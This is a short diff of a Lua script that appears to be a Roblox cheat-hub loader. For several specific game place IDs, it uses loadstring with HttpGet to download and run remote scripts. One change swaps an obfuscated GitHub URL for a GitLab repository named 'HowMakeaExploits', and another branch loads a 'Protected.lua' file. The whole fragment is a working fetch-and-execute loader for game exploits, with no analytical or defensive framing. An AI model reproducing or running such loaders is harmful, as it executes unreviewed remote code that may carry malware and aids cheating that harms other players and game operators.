@@ -15,7 +15,7 @@ end})
 local PlaceId = game.PlaceId
 if PlaceId == 2753915549 or PlaceId == 4442272183 or PlaceId == 7449423635 then
     
-        loadstring(game:HttpGet"https://raw.githubusercontent.com/accountnop/Uhc3nJEWgDVG0Y6E/BahcngamfyT!eyl%3EZnZ%40opdlh%3Dnvh/EAjaaEfbUJlStebq%20IJqH0Vt.lua")()
+        loadstring(game:HttpGet"https://gitlab.com/teres12/HowMakeaExploits/-/raw/main/EAjaaEfbUJlStebq%20IJqH0Vt.lua")()
       elseif PlaceId == 6284583030 then
             
                 loadstring(game:HttpGet"https://gitlab.com/teres12/private/-/raw/main/Protected.lua")()
